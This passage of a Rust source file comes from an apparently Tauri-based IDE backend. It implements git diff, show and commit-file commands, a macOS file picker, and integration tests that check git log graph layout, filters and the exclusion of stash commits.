            let old_line = lines[di].old_line;
            let folded = ai - di - 1; // 夹在中间的显式 del 行数
            lines[di].kind = "context".to_string();
            lines[di].new_line = new_line;
            lines[di].no_newline = None;
            lines.remove(ai);
            *additions = additions.saturating_sub(1);
            *deletions = deletions.saturating_sub(1);
            if folded == 0 {
                // 纯 EOF 换行差异：补一行可见的空白删除行表示旧文件的空白尾行
                if let Some(ol) = old_line {
                    lines.insert(
                        di + 1,
                        DiffLineDto {
                            kind: "del".to_string(),
                            old_line: Some(ol + 1),
                            new_line: None,
                            text: String::new(),
                            no_newline: None,
                            eof_no_newline: Some(true),
                        },
                    );
                    *deletions += 1;
                }
            } else {
                // 已有显式折叠行：空白折叠行承载 eof 标记；否则标记挂到内容行
                let last = di + folded;
                if lines[last].text.is_empty() {
                    lines[last].eof_no_newline = Some(true);
                } else {
                    lines[di].eof_no_newline = Some(true);
                }
            }
        }
    }

    // 方向二：旧文件末行无换行（标记落在 del 上）→ 新文件末尾多一个空白行
    if let Some(di) = lines
        .iter()
        .position(|l| l.kind == "del" && l.no_newline == Some(true))
    {
        let text = lines[di].text.clone();
        let old_line = lines[di].old_line;
        let mut ai = None;
        for (k, line) in lines.iter().enumerate().skip(di + 1) {
            match line.kind.as_str() {
                "add" if line.text == text => {
                    ai = Some(k);
                    break;
                }
                "add" => {}
                _ => break,
            }
        }
        if let Some(ai) = ai {
            let new_line = lines[ai].new_line;
            let folded = ai - di - 1;
            lines[ai].kind = "context".to_string();
            lines[ai].old_line = old_line;
            lines[ai].no_newline = None;
            lines.remove(di);
            *additions = additions.saturating_sub(1);
            *deletions = deletions.saturating_sub(1);
            if folded == 0 {
                if let Some(nl) = new_line {
                    lines.insert(
                        di + 1,
                        DiffLineDto {
                            kind: "add".to_string(),
                            old_line: None,
                            new_line: Some(nl + 1),
                            text: String::new(),
                            no_newline: None,
                            eof_no_newline: Some(true),
                        },
                    );
                    *additions += 1;
                }
            } else {
                let last = di + folded - 1;
                if lines[last].text.is_empty() {
                    lines[last].eof_no_newline = Some(true);
                } else {
                    lines[ai - 1].eof_no_newline = Some(true);
                }
            }
        }
    }
}

fn run_git_diff(dir: &str, args: &[&str]) -> Result<String, String> {
    let output = git_output(git_cmd().arg("-C").arg(dir).args(args))
        .map_err(|e| format!("git 调用失败: {e}"))?;

    if !output.status.success() {
        // git diff 在"有差异"时返回 1，无差异返回 0；非 0/1 才是真错误
        let code = output.status.code().unwrap_or(-1);
        if code != 1 {
            return Err(String::from_utf8_lossy(&output.stderr).to_string());
        }
    }

    Ok(String::from_utf8_lossy(&output.stdout).to_string())
}

/// 工作区中某个文件的 diff（staged=false 为工作区 vs 索引，true 为索引 vs HEAD）
#[tauri::command]
pub async fn git_diff(
    repo_path: Option<String>,
    path: String,
    staged: Option<bool>,
) -> Result<FileDiffDto, String> {
    // 最坏 3 次 spawn（diff → ls-files 探测 → diff --no-index），
    // 每次都是冷启动。丢 blocking 池避免占 ipc worker。
    tauri::async_runtime::spawn_blocking(move || git_diff_impl(repo_path, path, staged))
        .await
        .map_err(|e| format!("git_diff 任务失败: {e}"))?
}

fn git_diff_impl(
    repo_path: Option<String>,
    path: String,
    staged: Option<bool>,
) -> Result<FileDiffDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let mut args: Vec<&str> = vec!["diff", "--no-color", "--no-ext-diff"];
    if staged.unwrap_or(false) {
        args.push("--cached");
    }
    args.push("--");
    args.push(&path);

    let text = run_git_diff(&dir, &args)?;
    let (lines, additions, deletions) = parse_unified_diff(&text);
    let flags = patch_header_flags(&lines);
    let is_new = flags.is_new;
    let is_binary = flags.is_binary;

    // 新增文件（未跟踪，或已 `git add` 但 HEAD 里还没有）不产生常规 diff 输出：
    // 与空文件对比，生成「全新增」差异（对齐 PyCharm）
    let mut result_lines = lines;
    let mut result_add = additions;
    let mut result_del = deletions;
    let mut result_is_new = is_new;
    let mut result_is_binary = is_binary;

    if result_lines.is_empty() && !staged.unwrap_or(false) && is_new_file_vs_head(&dir, &path) {
        if let Some((l, a, d, bin)) = diff_against_empty_file(&dir, &path) {
            result_lines = l;
            result_add = a;
            result_del = d;
            result_is_new = true;
            result_is_binary = bin;
        }
    }

    let (result_lines, truncated) = cap_diff_lines(result_lines);
    Ok(FileDiffDto {
        path: path.clone(),
        old_path: None,
        is_new: result_is_new,
        is_deleted: flags.is_deleted,
        is_binary: result_is_binary,
        additions: result_add,
        deletions: result_del,
        lines: result_lines,
        truncated,
    })
}

/// 指定提交相对其父提交的 diff；`path` 为空则取整个提交
#[tauri::command]
pub async fn git_show(
    repo_path: Option<String>,
    commit: String,
    path: Option<String>,
) -> Result<FileDiffDto, String> {
    // 「整个提交」的 diff 在大提交上是几十万行文本 + 等量 DTO，同步执行会占住
    // ipc worker 数秒（与 git_diff 同一模式）—— 丢到 blocking 池。
    tauri::async_runtime::spawn_blocking(move || git_show_impl(repo_path, commit, path))
        .await
        .map_err(|e| format!("git_show 任务失败: {e}"))?
}

fn git_show_impl(
    repo_path: Option<String>,
    commit: String,
    path: Option<String>,
) -> Result<FileDiffDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    reject_option_like(&commit)?;
    let mut args: Vec<&str> = vec![
        "show",
        "--no-color",
        "--no-ext-diff",
        "--format=",
        "--end-of-options",
    ];
    args.push(&commit);
    if let Some(p) = path.as_deref().filter(|p| !p.is_empty()) {
        args.push("--");
        args.push(p);
    }

    let text = run_git_diff(&dir, &args)?;
    let (lines, additions, deletions) = parse_unified_diff(&text);
    let flags = patch_header_flags(&lines);
    let (lines, truncated) = cap_diff_lines(lines);

    Ok(FileDiffDto {
        path: path.unwrap_or_else(|| commit.clone()),
        old_path: None,
        is_new: flags.is_new,
        is_deleted: flags.is_deleted,
        is_binary: flags.is_binary,
        additions,
        deletions,
        lines,
        truncated,
    })
}

/// 指定两个提交间某个文件的 diff；`path` 为空则取两个提交间的完整 diff
#[tauri::command]
pub async fn git_diff_commits(
    repo_path: Option<String>,
    from_commit: String,
    to_commit: String,
    path: Option<String>,
) -> Result<FileDiffDto, String> {
    tauri::async_runtime::spawn_blocking(move || {
        git_diff_commits_impl(repo_path, from_commit, to_commit, path)
    })
    .await
    .map_err(|e| format!("git_diff_commits 任务失败: {e}"))?
}

fn git_diff_commits_impl(
    repo_path: Option<String>,
    from_commit: String,
    to_commit: String,
    path: Option<String>,
) -> Result<FileDiffDto, String> {
    let dir = repo_path.unwrap_or_else(|| ".".to_string());
    let from = from_commit.trim().to_string();
    let to = to_commit.trim().to_string();
    reject_option_like(&from)?;
    reject_option_like(&to)?;

    let mut args: Vec<&str> = vec![
        "diff",
        "--no-color",
        "--no-ext-diff",
        "--end-of-options",
        &from,
        &to,
    ];
    if let Some(p) = path.as_deref().filter(|p| !p.is_empty()) {
        args.push("--");
        args.push(p);
    }

    let text = run_git_diff(&dir, &args)?;
    let (lines, additions, deletions) = parse_unified_diff(&text);
    let flags = patch_header_flags(&lines);
    let (lines, truncated) = cap_diff_lines(lines);

    Ok(FileDiffDto {
        path: path.unwrap_or_else(|| format!("{from}..{to}")),
        old_path: None,
        is_new: flags.is_new,
        is_deleted: flags.is_deleted,
        is_binary: flags.is_binary,
        additions,
        deletions,
        lines,
        truncated,
    })
}
/// 读取任意 rev 下的文件内容（`git show <rev>:<path>`；rev 为空 = 索引 stage0）。
///
/// Diff 页用它拿两侧完整原文喂给 Monaco DiffEditor：patch 只含 hunk 与
/// 上下文，按它重建会丢掉文件其余部分并把行号错编成 1..N。
/// 路径在该 rev 不存在（新文件的父提交 / 删除的一侧）以及未知 revision
/// （根提交没有 `^`）都按「该侧为空文件」返回 Ok("") —— 与 git diff 把
/// 缺失侧当空的语义一致；其余失败照常上抛，由调用方决定如何兜底。
#[tauri::command]
pub async fn git_file_at_rev(
    repo_path: Option<String>,
    rev: String,
    path: String,
) -> Result<String, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        reject_option_like(&rev)?;
        // `git show rev:path` 要求 path 为仓库相对路径、正斜杠分隔
        let spec = format!("{}:{}", rev, path.replace('\\', "/"));
        let output = git_output(
            git_cmd()
                .arg("-C")
                .arg(&dir)
                .arg("show")
                .arg("--end-of-options")
                .arg(&spec),
        )
        .map_err(|e| format!("git 调用失败: {e}"))?;
        if !output.status.success() {
            let stderr = String::from_utf8_lossy(&output.stderr);
            let missing = stderr.contains("does not exist")
                || stderr.contains("exists on disk, but not in")
                || stderr.contains("unknown revision or path")
                || stderr.contains("unknown path or revision")
                || stderr.contains("ambiguous argument");
            if missing {
                return Ok(String::new());
            }
            return Err(stderr.to_string());
        }
        // 历史版本全文同样受软上限约束：大二进制/大文件的历史版本一次
        // git show 即几十 MB，Diff 页喂给 Monaco DiffEditor 会连带拖死。
        // 与 read_file_content 同口径（软上限，无 force 通道 —— 历史版本
        // 不需要编辑，拒绝即可，用户可到工作区看当前版本）。
        if output.stdout.len() as u64 > MAX_READ_FILE_BYTES {
            return Err(crate::error_proto::coded(
                "file_too_large",
                format!(
                    "{}:{} ({})",
                    rev,
                    path,
                    format_bytes(output.stdout.len() as u64)
                ),
            ));
        }
        Ok(String::from_utf8_lossy(&output.stdout).to_string())
    })
    .await
    .map_err(|e| format!("git_file_at_rev 任务失败: {e}"))?
}

/// 某个提交改动的文件清单（含增删行数）
#[tauri::command]
pub async fn git_commit_files(
    repo_path: Option<String>,
    commit: String,
) -> Result<Vec<CommitFileDto>, String> {
    // 单个 `git show` 要走完提交树 + diff，同步执行时占在 ipc worker 上。
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        reject_option_like(&commit)?;
        // numstat 与 name-status 必须分两次 spawn：git 同时给两个选项时只输出
        // name-status 视图（已实测验证），不存在一次调用拿两份的写法。两次
        // show 互不依赖，并发发起让冷启动重叠。
        let numstat_dir = dir.clone();
        let ns_dir = dir.clone();
        let numstat_commit = commit.clone();
        let ns_commit = commit.clone();

        let numstat_out = tauri::async_runtime::spawn_blocking(move || {
            git_output(git_cmd().arg("-C").arg(&numstat_dir).args([
                "-c",
                "core.quotepath=false",
                "show",
                "--numstat",
                "--format=",
                "--no-renames",
                "--end-of-options",
                &numstat_commit,
            ]))
        });
        let name_status_out = tauri::async_runtime::spawn_blocking(move || {
            git_output(git_cmd().arg("-C").arg(&ns_dir).args([
                "-c",
                "core.quotepath=false",
                "show",
                "--name-status",
                "--format=",
                "--no-renames",
                "--end-of-options",
                &ns_commit,
            ]))
        });

        let (numstat, name_status) = tauri::async_runtime::block_on(async {
            let numstat = numstat_out
                .await
                .map_err(|e| format!("git 调用失败: {e}"))?
                .map_err(|e| format!("git 调用失败: {e}"))?;
            // name-status 失败时退化为空输出：调用方会用 numstat 自己推出状态
            // （默认 M），与原实现 `.unwrap_or_default()` 的容错语义一致；
            // 但不再完全静默 —— 状态字母会全部退化成 M，用户需要知道原因。
            let name_status = match name_status_out.await {
                Ok(Ok(o)) => o,
                Ok(Err(e)) => {
                    log::warn!("git show --name-status 失败: {}（状态字母退化为 M）", e);
                    std::process::Output {
                        status: std::process::ExitStatus::default(),
                        stdout: Vec::new(),
                        stderr: Vec::new(),
                    }
                }
                Err(e) => {
                    log::warn!("git show --name-status 任务失败: {e}（状态字母退化为 M）");
                    std::process::Output {
                        status: std::process::ExitStatus::default(),
                        stdout: Vec::new(),
                        stderr: Vec::new(),
                    }
                }
            };
            Ok::<_, String>((numstat, name_status))
        })?;

        if !numstat.status.success() {
            log::warn!(
                "git show --numstat 失败: {}",
                String::from_utf8_lossy(&numstat.stderr).trim()
            );
            return Ok(Vec::new());
        }

        let stdout = String::from_utf8_lossy(&numstat.stdout);

        // 路径 -> 状态字母
        let mut status_map: HashMap<String, String> = HashMap::new();
        for line in String::from_utf8_lossy(&name_status.stdout).lines() {
            if let Some((status, path)) = line.split_once('\t') {
                status_map.insert(
                    decode_git_path(path),
                    status.trim().chars().next().unwrap_or('M').to_string(),
                );
            }
        }

        let mut files = Vec::new();
        for line in stdout.lines() {
            let parts: Vec<&str> = line.split('\t').collect();
            if parts.len() < 3 {
                continue;
            }
            let path = decode_git_path(parts[2]);
            files.push(CommitFileDto {
                status: status_map
                    .get(&path)
                    .cloned()
                    .unwrap_or_else(|| "M".to_string()),
                additions: parts[0].trim().parse().unwrap_or(0),
                deletions: parts[1].trim().parse().unwrap_or(0),
                path,
            });
        }

        Ok(files)
    })
    .await
    .map_err(|e| format!("git_commit_files 任务失败: {e}"))?
}

/// 多选提交的变更文件并集（按路径去重，+/− 累加）。
///
/// `commits` 必须按日志顺序（新→旧）传入：同一路径在多个提交里出现时，
/// 状态取最新一次提交的状态，统计累加所有所选提交。不能退化成首尾范围 diff，
/// 否则会带上未被选中的中间提交（用户在多选时明确要求只合并所选提交）。
#[tauri::command]
pub async fn git_commits_files(
    repo_path: Option<String>,
    commits: Vec<String>,
) -> Result<Vec<CommitFileDto>, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        if commits.is_empty() {
            return Ok(Vec::new());
        }
        for commit in &commits {
            reject_option_like(commit)?;
        }

        // BTreeMap 让平铺列表也保持稳定的路径顺序；目录树由前端再排序。
        let mut merged: std::collections::BTreeMap<String, (String, u32, u32)> =
            std::collections::BTreeMap::new();
        for commit in &commits {
            let numstat = git_output(git_cmd().arg("-C").arg(&dir).args([
                "-c",
                "core.quotepath=false",
                "show",
                "--numstat",
                "--format=",
                "--no-renames",
                "--end-of-options",
                commit,
            ]))
            .map_err(|e| format!("git 调用失败: {e}"))?;
            if !numstat.status.success() {
                return Err(format!(
                    "git show --numstat 失败: {}",
                    String::from_utf8_lossy(&numstat.stderr).trim()
                ));
            }

            let name_status = git_output(git_cmd().arg("-C").arg(&dir).args([
                "-c",
                "core.quotepath=false",
                "show",
                "--name-status",
                "--format=",
                "--no-renames",
                "--end-of-options",
                commit,
            ]));
            let mut status_map: HashMap<String, String> = HashMap::new();
            if let Ok(output) = name_status {
                if output.status.success() {
                    for line in String::from_utf8_lossy(&output.stdout).lines() {
                        if let Some((status, path)) = line.split_once('\t') {
                            status_map.insert(
                                decode_git_path(path),
                                status.trim().chars().next().unwrap_or('M').to_string(),
                            );
                        }
                    }
                }
            }

            for line in String::from_utf8_lossy(&numstat.stdout).lines() {
                let parts: Vec<&str> = line.split('\t').collect();
                if parts.len() < 3 {
                    continue;
                }
                let path = decode_git_path(parts[2]);
                let additions = parts[0].trim().parse::<u32>().unwrap_or(0);
                let deletions = parts[1].trim().parse::<u32>().unwrap_or(0);
                let status = status_map
                    .get(&path)
                    .cloned()
                    .unwrap_or_else(|| "M".to_string());
                let entry = merged.entry(path).or_insert_with(|| (status, 0, 0));
                entry.1 = entry.1.saturating_add(additions);
                entry.2 = entry.2.saturating_add(deletions);
            }
        }

        Ok(merged
            .into_iter()
            .map(|(path, (status, additions, deletions))| CommitFileDto {
                path,
                status,
                additions,
                deletions,
            })
            .collect())
    })
    .await
    .map_err(|e| format!("git_commits_files 任务失败: {e}"))?
}

/// 多选提交的合并 patch：逐个执行 `git show <commit> [-- path]` 并拼接，
/// 只包含显式选中的提交，绝不把中间未选提交算进来。
///
/// 不做临时树/重写历史：非连续提交本来就没有唯一的 base→target 树，
/// 前端以 unified patch 展示各选中提交的 diff。
#[tauri::command]
pub async fn git_commits_diff(
    repo_path: Option<String>,
    commits: Vec<String>,
    path: Option<String>,
) -> Result<FileDiffDto, String> {
    tauri::async_runtime::spawn_blocking(move || {
        let dir = repo_path.unwrap_or_else(|| ".".to_string());
        for commit in &commits {
            reject_option_like(commit)?;
        }
        let path_filter = path.as_deref().filter(|p| !p.is_empty());
        let mut text = String::new();
        for commit in &commits {
            let mut args: Vec<&str> = vec![
                "show",
                "--no-color",
                "--no-ext-diff",
                "--format=",
                "--no-renames",
                "--end-of-options",
                commit,
            ];
            if let Some(p) = path_filter {
                args.push("--");
                args.push(p);
            }
            let chunk = run_git_diff(&dir, &args)?;
            if chunk.trim().is_empty() {
                continue;
            }
            if !text.is_empty() {
                text.push('\n');
            }
            text.push_str(&chunk);
        }

        let (lines, additions, deletions) = parse_unified_diff(&text);
        let flags = patch_header_flags(&lines);
        let (lines, truncated) = cap_diff_lines(lines);
        Ok(FileDiffDto {
            path: path.unwrap_or_else(|| format!("{} commits", commits.len())),
            old_path: None,
            is_new: flags.is_new,
            is_deleted: flags.is_deleted,
            is_binary: flags.is_binary,
            additions,
            deletions,
            lines,
            truncated,
        })
    })
    .await
    .map_err(|e| format!("git_commits_diff 任务失败: {e}"))?
}

#[cfg(target_os = "macos")]
fn pick_path_native(title: Option<String>, default_path: Option<String>) -> Option<String> {
    use objc2_app_kit::NSOpenPanel;
    use objc2_foundation::{MainThreadMarker, NSString, NSURL};
    let mtm = MainThreadMarker::new()?;
    let panel = NSOpenPanel::openPanel(mtm);
    panel.setCanChooseFiles(true);
    panel.setCanChooseDirectories(true);
    panel.setAllowsMultipleSelection(false);
    if let Some(t) = &title {
        panel.setTitle(Some(&NSString::from_str(t)));
    }
    if let Some(p) = &default_path {
        let ns_str = NSString::from_str(p);
        let url = NSURL::fileURLWithPath(&ns_str);
        panel.setDirectoryURL(Some(&url));
    }
    let res = panel.runModal();
    if res == 1 {
        panel.URL().and_then(|u| u.path()).map(|p| p.to_string())
    } else {
        None
    }
}

/// 打开文件或目录选择对话框（macOS 原生 NSOpenPanel，允许同时选择文件或目录）
#[tauri::command]
pub async fn pick_path(
    app: tauri::AppHandle,
    title: Option<String>,
    default_path: Option<String>,
    grants: tauri::State<'_, PathGrantRegistry>,
) -> Result<Option<String>, String> {
    #[cfg(target_os = "macos")]
    {
        let (tx, rx) = std::sync::mpsc::channel();
        app.run_on_main_thread(move || {
            let res = pick_path_native(title, default_path);
            let _ = tx.send(res);
        })
        .map_err(|e| format!("Failed to run on main thread: {e}"))?;
        let picked = rx.recv().map_err(|e| format!("Dialog aborted: {e}"))?;
        if let Some(p) = picked.as_deref() {
            grants.grant(Path::new(p));
        }
        Ok(picked)
    }
    #[cfg(not(target_os = "macos"))]
    {
        let _app = app;
        let _title = title;
        let _default_path = default_path;
        let _grants = grants;
        Ok(None)
    }
}

#[cfg(test)]
mod git_log_integration_tests {
    use super::*;

    fn git(dir: &Path, args: &[&str]) {
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {:?} failed: {}",
            args,
            String::from_utf8_lossy(&out.stderr)
        );
    }

    /// 真实仓库端到端：分叉 + 合并的轨道布局与 skip 分页
    ///
    /// 提交必须带递增时间戳（git_at）：同秒的一批提交在拓扑序同刻之间不保证
    /// sibling 顺序（git 内部遍历细节），行序断言会随机失败。递增时间戳让顺序
    /// 完全由数据决定（与 graph_page_continuity_tests::run_git 同一理由）。
    /// 必须走 Command 级 env，不能 set_var：测试并行跑，进程级 env 会漏进别家。
    fn git_at(dir: &Path, args: &[&str], tick: u32) {
        let date = format!("2024-02-01T00:00:{tick:02} +0000");
        let mut cmd = git_cmd();
        cmd.arg("-C").arg(dir);
        for a in args {
            cmd.arg(a);
        }
        cmd.env("GIT_AUTHOR_DATE", &date)
            .env("GIT_COMMITTER_DATE", &date);
        let out = git_output(&mut cmd).unwrap();
        assert!(
            out.status.success(),
            "git {args:?} 失败: {}",
            String::from_utf8_lossy(&out.stderr)
        );
    }

    #[test]
    fn git_log_builds_real_merge_graph_and_pages() {
        let dir = std::env::temp_dir().join(format!("ide_graph_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let user = ["-c", "user.email=t@t.com", "-c", "user.name=t"];
        let commit = |msg: &'static str| -> Vec<&'static str> {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        git(&dir, &["init", "-q", "-b", "main"]);
        fs::write(dir.join("a"), "1").unwrap();
        git(&dir, &["add", "."]);
        git_at(&dir, &commit("base"), 0);
        git(&dir, &["checkout", "-qb", "feat"]);
        fs::write(dir.join("b"), "2").unwrap();
        git(&dir, &["add", "."]);
        git_at(&dir, &commit("feat1"), 1);
        git(&dir, &["checkout", "-q", "main"]);
        fs::write(dir.join("c"), "3").unwrap();
        git(&dir, &["add", "."]);
        git_at(&dir, &commit("main1"), 2);
        let mut merge_args: Vec<&str> = user.to_vec();
        merge_args.extend_from_slice(&["merge", "--no-ff", "feat", "-m", "merge feat"]);
        git_at(&dir, &merge_args, 3);

        let repo = Some(dir.to_string_lossy().to_string());
        let commits = git_log_impl(repo.clone(), Some(10), None, None, None, None).unwrap();
        assert_eq!(commits.len(), 4, "应为 merge/main1/feat1/base 四个提交");

        // 合并提交：两个父提交，分别接管轨道 0 与新开轨道 1
        let merge = &commits[0];
        assert_eq!(merge.parents.len(), 2);
        assert_eq!(merge.is_merge, Some(true));
        assert_eq!(merge.graph_track, 0);
        assert_eq!(
            merge.graph_outs,
            vec![
                GraphEdgeDto { from: 0, to: 0 },
                GraphEdgeDto { from: 0, to: 1 }
            ]
        );

        // 根提交被两条分支同时汇入
        let root = &commits[3];
        assert!(root.parents.is_empty());
        assert_eq!(root.graph_ins, vec![1]);

        // No Merges：合并提交被隐藏，其余历史不变
        let no_merges = git_log_impl_filtered(
            repo.clone(),
            Some(10),
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            Some(true),
        )
        .unwrap();
        assert_eq!(no_merges.len(), 3, "No Merges 应只剩 main1/feat1/base");
        assert!(no_merges.iter().all(|c| c.is_merge != Some(true)));

        // First Parent：只沿合并提交的第一父链（main），feat1 不应出现
        let first_parent = git_log_impl_filtered(
            repo.clone(),
            Some(10),
            None,
            None,
            None,
            None,
            None,
            None,
            None,
            Some(true),
            None,
        )
        .unwrap();
        assert_eq!(
            first_parent
                .iter()
                .map(|c| c.message.as_str())
                .collect::<Vec<_>>(),
            vec!["merge feat", "main1", "base"]
        );

        // skip 分页：只锁"分页与全量逐行一致"的真契约，不锁 sibling 行序 ——
        // --topo-order 下 feat1/main1 谁先是 git 遍历细节（后列出的父先行），
        // 与日期无关，硬断言 "main1 先" 只是把实现癖好写进测试。
        let page2 = git_log_impl(repo, Some(2), Some(1), None, None, None).unwrap();
        assert_eq!(page2.len(), 2);
        for (i, (truth, got)) in commits.iter().skip(1).zip(page2.iter()).enumerate() {
            assert_eq!(truth.message, got.message, "第 {i} 行消息不一致");
            assert_eq!(truth.graph_track, got.graph_track, "第 {i} 行轨道不一致");
            assert_eq!(
                truth.graph_straight, got.graph_straight,
                "第 {i} 行直通不一致"
            );
            assert_eq!(truth.graph_outs, got.graph_outs, "第 {i} 行出边不一致");
        }

        let _ = fs::remove_dir_all(&dir);
    }

    /// --all 日志标记 in_head：HEAD 停在历史版本时，其后/旁支提交 in_head=false，
    /// 面板据此把行背景置灰；HEAD 祖先保持 true。
    #[test]
    fn git_log_marks_commits_outside_head_history() {
        let dir = std::env::temp_dir().join(format!("ide_inhead_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();

        let commit = |msg: &'static str| -> Vec<&'static str> {
            vec![
                "-c",
                "user.email=t@t.com",
                "-c",
                "user.name=t",
                "commit",
                "-qm",
                msg,
            ]
        };

        git(&dir, &["init", "-q", "-b", "main"]);
        fs::write(dir.join("a"), "1").unwrap();
        git(&dir, &["add", "."]);
        git(&dir, &commit("base"));
        // 分叉：feat 上的提交不在 main(HEAD) 历史内
        git(&dir, &["checkout", "-qb", "feat"]);
        fs::write(dir.join("b"), "2").unwrap();
        git(&dir, &["add", "."]);
        git(&dir, &commit("feat1"));
        git(&dir, &["checkout", "-q", "main"]);

        let repo = Some(dir.to_string_lossy().to_string());
        let commits = git_log_impl(repo, Some(10), None, Some(true), None, None).unwrap();
        assert_eq!(commits.len(), 2, "all refs 应列出 feat1 与 base");

        let feat1 = commits
            .iter()
            .find(|c| c.message == "feat1")
            .expect("feat1 应在日志中");
        let base = commits
            .iter()
            .find(|c| c.message == "base")
            .expect("base 应在日志中");
        assert_eq!(
            feat1.in_head,
            Some(false),
            "旁支提交不在 HEAD 历史，应标记为置灰"
        );
        assert_eq!(base.in_head, Some(true), "HEAD 祖先应标记在历史内");

        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn git_log_filters_by_branch_and_path() {
        // PyCharm 日志工具栏的 Branch / Paths 过滤：
        // branch 参数等价 `git log <ref>`，path 参数等价 `git log -- <path>`。
        let dir = std::env::temp_dir().join(format!("ide_log_filter_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        git(&dir, &["init", "-q", "-b", "main"]);
        let user = ["-c", "user.email=t@t", "-c", "user.name=t"];

        fs::write(dir.join("keep.txt"), "a").unwrap();
        fs::write(dir.join("only-main.txt"), "a").unwrap();
        git(&dir, &["add", "."]);
        let mut c1: Vec<&str> = user.to_vec();
        c1.extend_from_slice(&["commit", "-qm", "base"]);
        git(&dir, &c1);

        git(&dir, &["checkout", "-q", "-b", "feature"]);
        fs::write(dir.join("feat.txt"), "b").unwrap();
        git(&dir, &["add", "."]);
        let mut c2: Vec<&str> = user.to_vec();
        c2.extend_from_slice(&["commit", "-qm", "feat only"]);
        git(&dir, &c2);

        git(&dir, &["checkout", "-q", "main"]);
        fs::write(dir.join("only-main.txt"), "b").unwrap();
        git(&dir, &["add", "."]);
        let mut c3: Vec<&str> = user.to_vec();
        c3.extend_from_slice(&["commit", "-qm", "main only"]);
        git(&dir, &c3);

        let repo = Some(dir.to_string_lossy().to_string());

        // 全部分支：三个提交都能看到
        let all = git_log_impl(repo.clone(), Some(20), None, Some(true), None, None).unwrap();
        assert!(
            all.iter().any(|c| c.message == "feat only"),
            "全部分支应含 feature 提交"
        );
        assert!(all.iter().any(|c| c.message == "main only"));

        // Branch 过滤：只看 feature
        let feat = git_log_impl(
            repo.clone(),
            Some(20),
            None,
            None,
            Some("feature".into()),
            None,
        )
        .unwrap();
        let msgs: Vec<&str> = feat.iter().map(|c| c.message.as_str()).collect();
        assert_eq!(
            msgs,
            vec!["feat only", "base"],
            "feature 分支应只有两个提交"
        );

        // 组合过滤：Branch + Author 必须同时生效（旧实现把 --author 放在
        // --end-of-options 之后，git 直接报错并被吞成空列表）。
        let combo = git_log_impl_filtered(
            repo.clone(),
            Some(20),
            None,
            None,
            Some("feature".into()),
            None,
            Some("t".into()),
            None,
            None,
            None,
            None,
        )
        .unwrap();
        let msgs: Vec<&str> = combo.iter().map(|c| c.message.as_str()).collect();
        assert_eq!(msgs, vec!["feat only", "base"], "branch+author 组合过滤");

        // Paths 过滤：只看改动过 only-main.txt 的提交
        let by_path = git_log_impl(
            repo.clone(),
            Some(20),
            None,
            Some(true),
            None,
            Some("only-main.txt".into()),
        )
        .unwrap();
        let msgs: Vec<&str> = by_path.iter().map(|c| c.message.as_str()).collect();
        assert_eq!(
            msgs,
            vec!["main only", "base"],
            "路径过滤应只保留改过该文件的提交"
        );

        // 提交时间统一为 unix 秒，供前端按 PyCharm 风格格式化
        assert!(
            all.iter()
                .all(|c| c.date.len() >= 9 && c.date.chars().all(|ch| ch.is_ascii_digit())),
            "date 应为 unix 秒时间戳，实际: {:?}",
            all.iter().map(|c| &c.date).collect::<Vec<_>>()
        );

        let _ = fs::remove_dir_all(&dir);
    }

    /// 「全部分支」日志不得混入 stash 内部提交。
    ///
    /// 裸 `git log --all` 在新版 git 下会连带 refs/stash，把它的两行注入
    /// 提交（"WIP on ..." 与 "index on ..."）推进日志。这两条提交有双父，
    /// DAG 上画成三分叉噪声，且 stash 语义上归属独立的 Stash/Shelf 工具
    /// 而非提交历史（PyCharm 的 Log 面板默认不显示，需显式勾 Stashes）。
    /// 这里锁死 git_log_impl 用 --branches --remotes 而非 --all。
    #[test]
    fn git_log_all_refs_excludes_stash_commits() {
        let dir = std::env::temp_dir().join(format!("ide_log_stash_it_{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        git(&dir, &["init", "-q", "-b", "main"]);
        let user = ["-c", "user.email=t@t", "-c", "user.name=t"];

        fs::write(dir.join("a.txt"), "a").unwrap();
        git(&dir, &["add", "."]);
        let mut c1: Vec<&str> = user.to_vec();
        c1.extend_from_slice(&["commit", "-qm", "base"]);
        git(&dir, &c1);

        // 造一个真实 stash：staged + unstaged 两层差异，产生两条内部提交
        // （WIP on / index on）
        fs::write(dir.join("a.txt"), "b").unwrap();
        git(&dir, &["add", "."]);
        fs::write(dir.join("a.txt"), "c").unwrap();
        let stash = {
            let mut cmd = git_cmd();
            cmd.arg("-C")
                .arg(&dir)
                .arg("stash")
                .arg("push")
                .arg("-qm")
                .arg("wip");
            git_output(&mut cmd).unwrap()
        };
        assert!(stash.status.success(), "stash push 应成功");
        let stash_exists = {
            let mut cmd = git_cmd();
            cmd.arg("-C")
                .arg(&dir)
                .arg("rev-parse")
                .arg("--verify")
                .arg("refs/stash");
            git_output(&mut cmd).unwrap()
        };
        assert!(stash_exists.status.success(), "仓库应存在 refs/stash");

        let repo = Some(dir.to_string_lossy().to_string());
        let all = git_log_impl(repo, Some(50), None, Some(true), None, None).unwrap();
        let msgs: Vec<&str> = all.iter().map(|c| c.message.as_str()).collect();

        assert!(
            !msgs
                .iter()
                .any(|m| m.starts_with("WIP on") || m.starts_with("index on")),
            "全部分支日志不得混入 stash 内部提交，实际: {:?}",
            msgs
        );
        assert!(msgs.contains(&"base"), "真实提交应保留，实际: {:?}", msgs);
